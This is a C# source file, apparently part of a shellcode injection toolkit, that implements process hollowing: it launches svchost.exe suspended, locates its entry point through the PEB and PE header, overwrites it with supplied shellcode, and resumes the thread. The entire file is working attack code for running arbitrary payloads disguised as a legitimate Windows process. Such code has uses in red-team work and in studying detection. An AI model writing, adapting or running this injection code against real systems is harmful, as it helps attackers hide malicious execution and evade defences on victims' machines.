using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

using static ShellcodeInjectionTechniques.Debugger;
using static ShellcodeInjectionTechniques.Native;

namespace ShellcodeInjectionTechniques
{
    class ProcessHollow : ITechnique
    {
        public void Run(Process target, byte[] shellcode)
        {
            // Create a new process in a suspended state
            STARTUPINFO lpStartupInfo = new STARTUPINFO();
            PROCESS_INFORMATION lpProcessInformation = new PROCESS_INFORMATION();
            CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, ProcessCreationFlags.CREATE_SUSPENDED | ProcessCreationFlags.CREATE_NO_WINDOW, IntPtr.Zero, null, ref lpStartupInfo, out lpProcessInformation);
            Debug("[+] CreateProcess(): C:\\Windows\\System32\\svchost.exe");

            // locate the PEB inside the process
            PROCESS_BASIC_INFORMATION procInformation = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = lpProcessInformation.hProcess;
            ZwQueryInformationProcess(hProcess, 0x0, ref procInformation, (uint)(IntPtr.Size * 6), ref tmp);

            // locate the image base - PEB + 0x10
            IntPtr ptrToImageBase = (IntPtr)((Int64)procInformation.PebAddress + 0x10);
            Debug("[+] Pointer to ImageBase: 0x{0}", new string[] { ptrToImageBase.ToString("X") } );

            // read the process memory
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            Debug("[+] ReadProcessMemory() - image base pointer: 0x{0}", new string[] { ptrToImageBase.ToString("X") });

            // locate svchost base, converted to a 64-bit integer then cast to an IntPtr
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
            Debug("[+] ImageBase: 0x{0}", new string[] { svchostBase.ToString("X") });

            // read the memory location to get the entry point from the PE header
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
            Debug("[+] ReadProcessMemory() - svchost base: 0x{0}", new string[] { svchostBase.ToString("X") });

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
            Debug("[+] EntryPoint: 0x{0}", new string[] { ptrToImageBase.ToString("X") });

            WriteProcessMemory(hProcess, addressOfEntryPoint, shellcode, shellcode.Length, out nRead);
            Debug("[+] WriteProcessMemory(): 0x{0}", new string[] { addressOfEntryPoint.ToString("X") });

            Debug("[+] ResumeThread() - thread handle: 0x{0}", new string[] { lpProcessInformation.hThread.ToString("X") });
            ResumeThread(lpProcessInformation.hThread);
        }
    }
}
